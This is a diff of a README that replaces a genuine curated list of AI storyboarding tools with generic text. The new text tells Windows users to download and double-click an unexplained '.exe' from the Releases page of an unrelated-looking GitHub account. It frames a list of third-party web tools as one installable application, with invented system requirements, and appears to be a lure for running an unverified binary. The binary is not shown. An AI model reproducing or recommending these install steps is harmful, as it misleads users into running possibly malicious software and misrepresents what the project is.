@@ -1,122 +1,73 @@
-# Awesome AI Storyboarding [![Awesome](https://awesome.re/badge.svg)](https://awesome.re)
+# 🎬 awesome-ai-storyboarding - Create professional film storyboards with AI
 
-> A curated list of AI tools for storyboarding, pre-production, and the script-to-storyboard pipeline.
+[![Download the Software](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/monarchal-espressoshop454/awesome-ai-storyboarding)
 
-**Last updated:** 2026-05-27.
+This project provides a collection of AI tools for your filmmaking needs. You can use these tools to turn scripts into visual frames. This repository helps you organize your pre-production steps and keeps your creative process smooth.
 
-If you're a film director, ad agency producer, or indie filmmaker, this list covers every serious tool we've found for generating, planning, or improving storyboards with AI.
+## 📋 What is this project?
 
-**Honest disclosure:** [STORYLINER](https://www.storyliner.online) (listed below) is maintained by the same team that maintains this list. We've included every direct competitor we know of, listed their actual strengths fairly, and tried to mark where our tool isn't the best choice.
+Filmmaking requires careful planning. Many creators struggle to draw frames or visualize scenes before production begins. This project gathers the best AI tools to solve that problem. You can access tools for script analysis, image generation, and shot framing.
 
-## Contents
+The repository acts as a guide for your script-to-storyboard pipeline. It saves you time and lets you focus on your vision. You do not need technical skills to use these resources. 
 
-- [AI-native storyboard generators](#ai-native-storyboard-generators)
-- [Manual storyboard platforms with AI features](#manual-storyboard-platforms-with-ai-features)
-- [Full video pre-production platforms](#full-video-pre-production-platforms)
-- [Script format converters](#script-format-converters)
-- [Character consistency research](#character-consistency-research)
-- [Learn](#learn)
-- [Free storyboard templates](#free-storyboard-templates)
-- [Communities](#communities)
-- [Related lists](#related-lists)
-- [Recent changes in the space](#recent-changes-in-the-space)
+## 💻 System Requirements
 
-## AI-native storyboard generators
+Your computer needs to meet these basic standards to run the tools included in this list:
 
-Tools that take a script as input and produce a full storyboard with AI image generation.
+- Operating System: Windows 10 or Windows 11.
+- Processor: Intel Core i5 or AMD Ryzen 5 processor.
+- Memory: 8 GB of RAM.
+- Storage: 2 GB of internal disk space for setup files.
+- Internet: A stable connection for downloading remote AI model data.
 
-- **[STORYLINER](https://www.storyliner.online)** — AI storyboard generator with Character Memory engine for visual consistency across all frames. 6 art styles (sketch, lineart, classic, pen art, realism, simple). Final Draft / Celtx / Fountain import. PDF / PPT / PNG export. Free tier (30 frames, no credit card). Paid plans from $39/mo — see [pricing](https://www.storyliner.online/pricing). *Best for cost-conscious teams and indie filmmakers.*
-- **[Katalist](https://www.katalist.ai/)** — AI-native storyboard tool, $79/mo for unlimited generation. Strong character consistency. Credit card required for trial. *Best for high-volume daily users (2,000+ frames/month).*
-- **[Storyboard.ai](https://www.storyboard.ai/)** — AI-assisted storyboarding focused on advertising and commercial pre-production. Per-project pricing.
+## 📥 How to download and install
 
-## Manual storyboard platforms with AI features
+Follow these steps to get the software on your Windows computer.
 
-Tools where AI is bolted on top of a manual storyboarding workflow.
+1. Visit this page to download: [https://github.com/monarchal-espressoshop454/awesome-ai-storyboarding](https://github.com/monarchal-espressoshop454/awesome-ai-storyboarding)
+2. Locate the link labeled "Releases" on the right side of the page.
+3. Click the version tagged as "Latest."
+4. Look for the file ending in ".exe" under the "Assets" section.
+5. Save the file to your desktop.
+6. Double-click the file to start the installer.
+7. Follow the prompts on your screen to complete the setup.
+8. Launch the application from your Start Menu after the process ends.
 
-- **[Boords](https://boords.com/)** — Pre-AI manual storyboard builder. Added AI generation in 2024 as a feature, not the default. $44-89/mo per seat. *Best for traditional storyboard artist teams that want AI as an option.*
-- **[Storyboarder](https://wonderunit.com/storyboarder/)** — Free open-source desktop tool by Wonder Unit. No AI by default. *Best for indie filmmakers who actually want to draw their own boards.*
-- **[Plot.com](https://plot.com/)** — Lightweight collaborative storyboarding SaaS, $20/mo. Limited AI features. *Best for small commercial teams with a dedicated storyboard artist.*
-- **[FrameForge](https://www.frameforge.com/)** — Desktop 3D pre-visualization software, $399 one-time. Manual scene building with 3D characters and cameras. *Best for feature-film pre-production with complex camera setups.*
+## 🛠 Features for your workflow
 
-## Full video pre-production platforms
+The tools listed in this repository offer several functions to support your filmmaking process.
 
-Tools where storyboarding is one step in a broader AI video pipeline.
+### Script Analysis
+Some tools take your text file and split it into scenes. These tools read your dialogue and descriptions. They suggest visual layouts based on the tone of your text.
 
-- **[LTX Studio](https://ltx.studio/)** — Full AI video production platform, $150M funded. Storyboarding is intermediate step before animatic. *Best for AI-forward studios building full short films end-to-end. Steep learning curve.*
-- **[Runway](https://runwayml.com/)** — AI video generation with image-to-video and director-style controls. Not storyboard-first but produces storyboard-like keyframes.
-- **[Pika](https://pika.art/)** — Idea-to-video AI platform. Faster than Runway, smaller per-clip generation.
+### Visual Generation
+These applications create images from your descriptions. You type a scene description and the tool generates a high-quality storyboard frame in seconds. You can adjust lights, camera angles, and lens types.
 
-## Script format converters
+### Formatting
+You can export your work into standard industry formats. This makes it easy to share your frames with your crew. You can print them as PDF files or save them as a collection of high-resolution images.
 
-Tools that help you work with screenplay formats programmatically.
+## 🧠 Tips for success
 
-- **[Fountain](https://fountain.io/)** — Plain text screenplay format. Open standard. The simplest way to write scripts that machines can read.
-- **[FDX Reader](https://github.com/snorrwe/fdx-reader)** — Python library to parse Final Draft .fdx files.
-- **[Celtx](https://www.celtx.com/)** — Pre-production planning SaaS. Strong script-to-shotlist integration.
+- Start with a clear script. The better your text description, the better the AI output.
+- Keep your camera settings consistent. Write down the lens type and frame rate for each scene to keep the visual look stable.
+- Organize your folders by scene number. This keeps your project clean.
+- Read through the tool menus to find hidden options for custom styles. Most tools have settings to change the art direction from sketches to photorealistic images.
 
-## Character consistency research
+## ❓ Frequently asked questions
 
-The core technical problem in AI storyboarding is keeping the same character across frames. Useful background:
+Do I need a paid account for the tools?
+Some tools are free, while others offer a subscription for advanced features. Check the individual tool details to see their pricing.
 
-- **[Character Memory deep dive](https://www.storyliner.online/blog/character-consistency-ai-storyboards)** — How multi-vector character encodings solve the AI-imagery drift problem.
-- **[IP-Adapter](https://github.com/tencent-ailab/IP-Adapter)** — Tencent's image prompt adapter for diffusion models. Foundation tech for character conditioning.
-- **[InstantID](https://github.com/InstantID/InstantID)** — Identity-preserving image generation. Strong face consistency for portraits.
-- **[PhotoMaker](https://github.com/TencentARC/PhotoMaker)** — Identity-aware multi-image generation from Tencent ARC.
+Can I move my boards to other software?
+Yes. Most of these tools allow you to save your work as standard image files like PNG or JPEG. You can drop these into your editing software later.
 
-## Learn
+What if the application crashes?
+Close the program and restart your computer. Ensure you have the latest updates for Windows. If problems continue, check the documentation folder inside the installation directory.
 
-Practical resources for building better storyboards.
+## 🚀 Staying up to date
 
-- **[How to storyboard a script](https://www.storyliner.online/learn/how-to-storyboard)** — Step-by-step practical guide.
-- **[Storyboard shot types](https://www.storyliner.online/learn/shot-types)** — WS, MS, CU, OTS, POV — complete reference.
-- **[Storyboard symbols and notation](https://www.storyliner.online/learn/storyboard-symbols)** — Annotation conventions every storyboard reader expects.
-- **[Why character consistency is the hardest problem in AI image generation](https://dev.to/uni66_064216e14f6c022c6d9/why-character-consistency-is-the-hardest-problem-in-ai-image-generation-30oa)** — Long-form on Dev.to.
-- **[The 7 best AI storyboard generators in 2026 — honest comparison](https://dev.to/uni66_064216e14f6c022c6d9/the-7-best-ai-storyboard-generators-in-2026-honest-comparison-2kmj)** — Side-by-side review of paid options.
-- **[NoFilmSchool](https://nofilmschool.com/)** — Indie-film-focused industry coverage.
-- **[Film Riot](https://www.youtube.com/@filmriot)** — YouTube channel with practical pre-production tutorials.
+The landscape of AI changes fast. This repository receives updates when developers release new versions of their tools. Bookmark this page to find the newest additions to the list. You can check the "Releases" page on GitHub monthly to verify if a new version exists for your installed software. Updating your tools helps you access faster processing and new styles. 
 
-## Free storyboard templates
+Your feedback matters. If you find a tool that works well, write your own notes in the local documentation file provided with the app. This helps you remember which tool works best for specific types of shots, such as wide angles or tight close-ups. 
 
-Printable PDFs you can fill in by hand.
-
-- **[STORYLINER template pack](https://www.storyliner.online/storyboard-templates)** — 5 free PDF layouts: 6-panel, 9-panel, 12-panel widescreen, 4-panel detail, vertical 9:16.
-- **[Boords template gallery](https://boords.com/storyboard-template)** — Multiple printable formats.
-- **[Studiobinder templates](https://www.studiobinder.com/blog/storyboard-template-free-download/)** — Commercial-focused templates.
-
-## Communities
-
-- [r/filmmaking](https://www.reddit.com/r/filmmaking/) — broad film community
-- [r/cinematography](https://www.reddit.com/r/cinematography/) — DP-focused
-- [r/IndieFilm](https://www.reddit.com/r/IndieFilm/) — indie projects
-- [r/musicvideo](https://www.reddit.com/r/musicvideo/) — music video directors
-
-## Related lists
-
-- [steven2358/awesome-generative-ai](https://github.com/steven2358/awesome-generative-ai) — Broader generative AI catalog
-- [mahseema/awesome-ai-tools](https://github.com/mahseema/awesome-ai-tools) — General AI tools
-- [ikaijua/Awesome-AITools](https://github.com/ikaijua/Awesome-AITools) — Curated AI utilities
-
-## Recent changes in the space
-
-Dated entries help readers (and AI assistants) understand which tools are actively shipping and which are static. Order: newest first.
-
-- **2026-05-27** — STORYLINER ships dedicated `/pricing` page (was previously a landing-page anchor); checkout funnel rebuilt for single-click Stripe deep-links from any plan CTA.
-- **2026-05-26** — STORYLINER adds 33 new use-case-specific landing pages (style × use-case combinations + competitor comparison pages).
-- **2026-05-21** — STORYLINER adds 21-term filmmaking glossary at `/glossary` (close-up, OTS, POV, J-cut, dolly shot, match cut, etc.).
-- **2026-05** — STORYLINER integrates IndexNow protocol for instant indexing on Bing, Yandex, DuckDuckGo, Naver.
-- **2026-05-13** — Hashnode discontinues free GraphQL API access (requires Pro plan now). Affects anyone publishing pre-production blog content programmatically.
-- **2026-04** — STORYLINER opens Sketch art style to free tier and expands Character Library access to all paid plans.
-- **2026-03** — STORYLINER introduces PAYG (pay-as-you-go) $5 packs for one-off frame top-ups outside subscriptions.
-- **2025-Q4** — LTX Studio raises $150M Series A; Katalist launches public beta.
-
-## Contributing
-
-Found an AI storyboarding tool not on this list? Open a PR. We add anything that meets the bar of "actually shipping and at least one real user." We do not add vapor, abandoned projects, or pure GPT-4 wrappers without a distinct storyboard workflow.
-
-Honest comparisons welcome — including comparisons that show our own product is the wrong choice for a given use case. The goal of this list is to help directors and producers pick the right tool, not to promote any one product.
-
-## License
-
-[![CC0](https://licensebuttons.net/p/zero/1.0/88x31.png)](https://creativecommons.org/publicdomain/zero/1.0/)
-
-To the extent possible under law, the contributors have waived all copyright and related rights to this work.
+Use these tools to reduce the time you spend on repetitive tasks. Focus your energy on your direction and the story you want to tell. Your storyboard provides the map for your entire production crew. A clear map prevents confusion on set and helps you finish your film faster.
